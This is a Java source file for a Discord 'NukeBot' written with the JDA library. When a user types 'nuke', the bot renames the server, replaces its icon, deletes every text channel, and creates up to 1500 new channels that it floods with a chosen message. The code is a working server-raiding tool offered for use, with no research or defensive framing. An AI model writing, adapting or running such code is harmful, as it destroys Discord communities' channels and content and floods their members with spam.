package si.f5.stsaria.nuke;

import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

import javax.imageio.ImageIO;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Icon;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.GatewayIntent;

public class NukeBot extends ListenerAdapter{
	private static JDA jda = null;
	private static String BOT_TOKEN = "";
	private static String MESSAGE = "";
	private static String SERVER_CHANNEL_NAME = "";
	private static String SERVER_IMAGE_URL = "";
	
	void startNuke(MessageReceivedEvent event) {
		Guild guild = event.getGuild();
		// 鯖名変更
		guild.getManager().setName(SERVER_CHANNEL_NAME).queue();
		// 鯖アイコンを変える
		try {
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			URL url = URI.create(SERVER_IMAGE_URL).toURL();
			BufferedImage image = ImageIO.read(url);
			ImageIO.write(image, "png", baos);
			byte[] imageBytes = baos.toByteArray();
			guild.getManager().setIcon(Icon.from(imageBytes)).queue();
		} catch (MalformedURLException e) {} catch (IOException e) {}
		List<TextChannel> channels = guild.getTextChannels();
		for (TextChannel channel : channels) {
			channel.delete().queue();
		}
		List<TextChannel> createdChannels = new ArrayList<TextChannel>();
		for (int i = 0; i < 1500; i++) {
			createdChannels.add(guild.createTextChannel(SERVER_CHANNEL_NAME).complete());
			for (TextChannel channel : createdChannels) {
				channel.sendMessage(MESSAGE).queue();
			}
		}
	}
	
	public static void main(String[] args) {
		Scanner scanner = new Scanner(System.in);
		System.out.print("Token: ");
		BOT_TOKEN = scanner.nextLine();
		System.out.print("Message: ");
		MESSAGE = scanner.nextLine();
		System.out.print("Server and Channel name: ");
		SERVER_CHANNEL_NAME = scanner.nextLine();
		System.out.print("Server image URL: ");
		SERVER_IMAGE_URL = scanner.nextLine();
		scanner.close();
		jda = JDABuilder.createDefault(BOT_TOKEN)
                .setRawEventsEnabled(true)
                .enableIntents(GatewayIntent.MESSAGE_CONTENT)
                .addEventListeners(new NukeBot())
                .build();

		jda.updateCommands().queue();
	}
	
	@Override
    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) {
        	return;
        } 
        switch(event.getMessage().getContentRaw()) {
        case "nuke":
        	startNuke(event);
        }
	}
	@Override
    public void onSlashCommandInteraction(SlashCommandInteractionEvent event) {
	}
}
